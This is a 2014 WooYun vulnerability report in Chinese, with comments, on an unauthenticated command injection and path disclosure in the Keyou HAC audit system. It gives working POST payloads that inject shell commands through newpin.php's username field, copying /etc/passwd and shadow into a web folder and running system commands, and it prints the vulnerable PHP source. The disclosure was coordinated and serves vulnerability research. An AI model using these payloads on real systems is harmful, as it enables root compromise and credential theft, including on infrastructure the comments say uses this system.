{"id": 4167, "wybug_id": "wooyun-2014-051345", "wybug_title": "江南科友HAC运维审计系统存在命令注入及暴路径漏洞（无需登录）", "wybug_corp": "江南科友科技股份有限公司", "wybug_author": "wefgod", "wybug_date": "2014-02-18 23:42", "wybug_open_date": "2014-05-19 23:43", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["命令执行", "命令注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-19：\t细节向公众公开  简要描述： 先说：非struts2。root权限，好爽的。不用登录，更爽的！ 详细说明：  HAC的登录界面截图如下：\n\n运维审计系统到底有多重要，就不用提了吧？有了这台服务器到底会有多少东西沦陷，这就不必说了。以下的测试都是在内网进行的先说个暴路径的。post提交以下数据https://10.100.113.11/login.phppassword_check=1&account=1&password=1&usb_code=&certcn[]=&randvalue=1366349330&notifypwd=其实就是certcn[]做了点处理，然后就暴了路径：\n\n\n<b>Warning</b>:  explode() expects parameter 2 to be string, array given in <b>/usr/local/apache2/htdocs/project/www/login.php</b> on line <b>38</b><br />\n   漏洞证明：  再说命令注入的问题，问题就产生在根目录下的newpin.php文件，这个应该是添加pin码的文件好几个参数只要在前后附加上&或者|就可以直接执行命令，比如我post以下数据：https://1.1.1.1/newpin.phpusername=1%26cp+%2Fetc%2Fpasswd+%2Fusr%2Flocal%2Fapache2%2Fhtdocs%2Fproject%2Fwww%2Fupload%2F1.txt+%26&tokencode=1&pincode=1&pincodes=1&msg=\n\n成功将文件复制到upload文件夹下：\n\n同时也复制了shadow文件：\n\n执行：1 | uname -a >  /usr/local/apache2/htdocs/project/www/upload/12.txt\n\n系统内核版本为：Linux hac 2.6.15.5hac_2.0 #2 SMP Mon Jun 7 05:13:40 CST 2010 i686 i686 i386 GNU/Linuxls -al >  /usr/local/apache2/htdocs/project/www/upload/12.txt\n\n1&ifconfig >>/usr/local/apache2/htdocs/project/www/upload/11.txt &\n\n直接看漏洞文件的源码：1&cp /usr/local/apache2/htdocs/project/www/newpin.php  /usr/local/apache2/htdocs/project/www/upload/11.txt &\n\n\nassign('msg',$msg); $template->output(); } if($_POST['username'] && $_POST['tokencode'] && $_POST['pincode']) { $cmd=MYSUDO.\"/usr/local/keyou/Bin/tokencheck \".$_POST['username'].\" \". $_POST['tokencode'].\" \".$_POST['pincode']; $rtn =HacExec($cmd,$output); if($rtn) { $msg=\"新PIN设置失败！\"; } else $msg=\"新PIN码已被认证服务器接受！\"; showPage($msg); exit; } showPage(NULL); exit(); ?>\n$cmd=MYSUDO.\"/usr/local/keyou/Bin/tokencheck \".$_POST['username'].\" \". $_POST['tokencode'].\" \".$_POST['pincode']虽然我PHP很弱，但是一看就有命令注入啊………………再看看首页源码：1&cp /usr/local/apache2/htdocs/project/www/login.php /usr/local/apache2/htdocs/project/www/upload/11.txt &\n\n<?phprequire_once('include.php');require_once './admin/SystemDB.php';admin/SystemDB.php可能是和数据库有关的。源码都在这了，截图一个：\n\n\n\n   修复方案：  你懂的。   版权声明：转载请注明来源 wefgod@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2014-02-23 11:39 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-19 00:21 |    \t\twhat_news \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:48        | 小菜一个 希望成为大菜)\t\t \n  你为什么这么牛    \n     2014-02-19 00:43 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @what_news 打酱油的    \n     2014-02-19 08:43 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  怎么转php和黑盒了    \n     2014-02-19 09:00 |    \t\tmagerx \t\t\t( 普通白帽子  |\t\t\t        Rank:257 漏洞数:45        | 别说话。)\t\t \n  你要不要这么爽。    \n     2014-02-19 09:50 |    \t\t川川 \t\t\t( 实习白帽子  |\t\t\t        Rank:68 漏洞数:28        | 今天我刷屏)\t\t \n  我最好奇的是这些系统都怎么找的啊    \n     2014-02-19 10:31 |    \t\tcuger \t\t\t( 普通白帽子  |\t\t\t        Rank:200 漏洞数:44        | 这个家伙很懒，什么也没留下)\t\t \n  @wefgod 你这么屌，你老板知道吗？    \n     2014-02-19 10:34 |    \t\t刺刺 \t\t\t( 普通白帽子  |\t\t\t        Rank:603 漏洞数:52        | 真正的安全并不是技术，而是人类善良的心灵...)\t\t \n  @wefgod 差不多是最撸力洞主了吧。    \n     2014-02-19 10:38 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @xsser 不小心看见的。所以就研究研究，学习一下子    \n     2014-02-19 10:46 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @刺刺 不是吧    \n     2014-02-19 10:46 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @cuger 路过的屌什么，你是谁我都没想起来……    \n     2014-02-19 11:02 |    \t\t漫步云端 \t\t\t( 普通白帽子  |\t\t\t        Rank:196 漏洞数:33        | I'm Ramble!)\t\t \n  @wefgod 大牛发洞好勤奋    \n     2014-02-19 12:21 |    \t\tcuger \t\t\t( 普通白帽子  |\t\t\t        Rank:200 漏洞数:44        | 这个家伙很懒，什么也没留下)\t\t \n  @wefgod 哈哈哈，高总，我们当年一起参加过入职培训的说~    \n     2014-02-19 12:29 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @cuger 这……还在北京？    \n     2014-02-19 15:11 |    \t\tcuger \t\t\t( 普通白帽子  |\t\t\t        Rank:200 漏洞数:44        | 这个家伙很懒，什么也没留下)\t\t \n  @wefgod 不在，对北京不感冒    \n     2014-02-19 15:49 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @cuger 明白，我回头想想，真想不起来是哪个……    \n     2014-05-20 08:53 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  这个系统，电网用的特别多    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}